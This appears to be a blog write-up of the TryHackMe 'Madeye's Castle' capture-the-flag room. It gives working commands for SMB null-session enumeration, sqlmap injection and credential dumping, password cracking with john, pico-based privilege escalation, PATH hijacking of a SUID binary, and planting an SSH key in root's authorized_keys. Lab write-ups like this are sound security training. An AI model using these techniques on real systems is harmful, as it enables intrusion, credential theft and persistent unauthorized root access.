---
layout: post
title:  "TryHackMe - Madeye Castle"
date:   2021-02-26 06:49:00 +0100
categories: [ctf, writeups, tryhackme]
---

Link to the ctf: [Madeye's Castle](https://tryhackme.com/room/madeyescastle)

# Web Server
By visiting the webpage, we see that the default apache page is changed.

![](/assets/Clipboard_2021-02-19-09-14-44.png)

by checking the source code, we get an hint.

![](/assets/Clipboard_2021-02-19-09-14-01.png)

Updating the `/etc/hosts` file we get another webpage that greetes us.

![](/assets/Clipboard_2021-02-19-09-15-53.png)

## SMB Share

nmap tells us that there's a Samba service on.
![](/assets/Clipboard_2021-02-19-09-18-10.png)

I'm gonna use [enum4linux-ng](https://github.com/cddmp/enum4linux-ng).

The following interesting things that the output it gives us are the following:

![](/assets/Clipboard_2021-02-19-09-22-04.png)
There is a Null Session vulnerability. This allows us to "login" without entering a password.

I then used `smbmap` to enumerate it further.
```bash
smbmap -H 10.10.197.154 -u '' -p '' 
```
![](/assets/Clipboard_2021-02-19-09-25-29.png)

`sambashare` is accessible. The following command is to recursively search for stuff inside a share.
```bash
smbmap -H 10.10.197.154 -u '' -p '' -R sambashare
```

![](/assets/Clipboard_2021-02-19-09-27-10.png)

To download the files, we just use the `--download` argument
```bash
smbmap -H 10.10.197.154 -u '' -p '' --download sambashare\\.notes.txt
smbmap -H 10.10.197.154 -u '' -p '' --download sambashare\\spellnames.txt
```

`notes.txt` contains the following:
```
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

and `spellnames.txt` it apper to be a wordlist. 



## SQL Injection
I intercepted the login request and passed it to sqlmap
I'm using the following sqlmap version: `1.5.2#pip`
> Fun fact: I had issue with sqlmap. Try to update it or change some arguments.
```bash
sqlmap -r request --level 5 --risk 3 --random-agent -T users --dump
```

![](/assets/Clipboard_2021-02-19-09-04-47.png)

I decided to crack this hash since it gives me more detail about it
"My linux username is my first name, and password uses best64"
so harry is the username, `best64` is a rule. I use john to crack the hash.

```bash
john --rules=best64 -w=./spellnames.txt --format=Raw-SHA512 hash.txt
```

![](/assets/Clipboard_2021-02-19-09-34-59.png)

We can use the credentials to log in via ssh.



## Horizontal Privilege Escalation
By checking `harry` privileges, we see that we can execute `pico` as `hermonine`
![](/assets/Clipboard_2021-02-19-09-36-41.png)
By using [Pico privesc techninques](https://gtfobins.github.io/gtfobins/pico/) we can spawn a shell as `hermonine`.

And then I put my ssh-key in `/home/hermonine/.ssh/authorized_keys` so I can have a better shell.

## Vertical privilege escalation
Got stuck here, thinking that I should do something that only hermonine could do.

I checked for SUID files

![](/assets/Clipboard_2021-02-19-09-51-22.png)

I used the `strings` command 

![](/assets/Clipboard_2021-02-19-09-52-00.png)

and I feel like this binary executes `uname -p` without specifying the full path for it. 
We can exploit it by just changing the enviroment path where Linux checks for binaries.

![](/assets/Clipboard_2021-02-19-09-54-31.png)

By runnin these commands, we tell linux to check first in our current directory for the linux command that it has to execute.
Then I create a bash script called `uname`
```bash
#!/bin/bash
echo "HIJACKED";
whoami; id;
```
and make it executable
```bash
chmod +x uname
```

but first we have to guess the number.
We can actually bypass it since it uses the current time as seed.
```c
#include <stdio.h>
#include <time.h>

int main(){
	srand(time(0));
	printf("%d", rand());
	return 0;
}
```
and compile it

```bash
gcc rand.c
```

![](/assets/Clipboard_2021-02-19-10-03-35.png)

okay, so we can confirm that we can execute commands as root.
The easiest way to get root would be to change `/bin/bash`'s suid.
Or we can write our key to `/root/.ssh/authorided_keys`.

I'm treating this as a penetration test, so I'd like to not mess things around more than I should, so I'll write my ssh key being careful to **append** it to the file.

```bash
#!/bin/bash
echo "HIJACKED";
mkdir /root/.ssh; chmod 600 /root/.ssh;
echo -e '\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFHMnWdBAAvTFNf4U01x9NjPFAbGWj4f/LyeCZPmHQdp/PH/u71OShS7wZREW9WzV73/TGxuwXYnaU1RJL/5wJc= lmao' >> /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

Now we can login as root via ssh.

```bash
ssh -i sshkey root@10.10.197.154
```

![](/assets/Clipboard_2021-02-19-10-11-16.png)

